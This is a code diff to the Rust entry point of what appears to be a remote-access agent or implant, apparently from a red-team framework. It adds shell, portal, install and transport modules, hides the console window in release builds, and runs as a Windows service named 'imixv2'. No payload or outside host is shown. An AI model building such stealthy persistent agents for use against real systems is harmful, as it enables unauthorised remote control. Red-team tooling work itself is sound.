@@ -2,7 +2,10 @@
     all(not(debug_assertions), not(feature = "win_service")),
     windows_subsystem = "windows"
 )]
-#![deny(warnings)]
+
+extern crate alloc;
+
+use anyhow::Result;
 
 #[cfg(all(feature = "win_service", windows))]
 #[macro_use]
@@ -10,43 +13,64 @@ extern crate windows_service;
 #[cfg(all(feature = "win_service", windows))]
 mod win_service;
 
+#[cfg(all(debug_assertions, feature = "tokio-console"))]
+use console_subscriber;
+
+pub use pb::config::Config;
+pub use transport::{ActiveTransport, Transport};
+
 mod agent;
+mod assets;
 mod install;
+mod portal;
 mod run;
+mod shell;
 mod task;
+#[cfg(test)]
+mod tests;
 mod version;
-use run::handle_main;
 
-// ============= Standard ===============
+#[tokio::main]
+async fn main() -> Result<()> {
+    #[cfg(all(debug_assertions, feature = "tokio-console"))]
+    {
+        console_subscriber::init();
+        println!("Tokio Console active.");
+    }
 
-#[tokio::main(flavor = "multi_thread", worker_threads = 128)]
-async fn main() {
-    #[cfg(debug_assertions)]
-    run::init_logging();
+    run::init_logger();
 
-    #[cfg(feature = "win_service")]
-    match windows_service::service_dispatcher::start("imix", ffi_service_main) {
-        Ok(_) => {}
+    #[cfg(feature = "install")]
+    {
+        #[cfg(debug_assertions)]
+        log::info!("beginning installation");
+
+        if std::env::args().any(|arg| arg == "install") {
+            return install::install().await;
+        }
+    }
+
+    #[cfg(all(feature = "win_service", windows))]
+    match windows_service::service_dispatcher::start("imixv2", ffi_service_main) {
+        Ok(_) => {
+            return Ok(());
+        }
         Err(_err) => {
             #[cfg(debug_assertions)]
             log::error!("Failed to start service (running as exe?): {_err}");
         }
     }
 
-    handle_main().await
+    run::run_agent().await
 }
 
 // ============ Windows Service =============
-
-#[cfg(all(feature = "win_service", not(target_os = "windows")))]
-compile_error!("Feature win_service is only available on windows targets");
-
-#[cfg(feature = "win_service")]
+#[cfg(all(feature = "win_service", windows))]
 define_windows_service!(ffi_service_main, service_main);
 
-#[cfg(feature = "win_service")]
-#[tokio::main(flavor = "multi_thread", worker_threads = 128)]
+#[cfg(all(feature = "win_service", windows))]
+#[tokio::main]
 async fn service_main(arguments: Vec<std::ffi::OsString>) {
     crate::win_service::handle_service_main(arguments);
-    handle_main().await;
+    let _ = run::run_agent().await;
 }
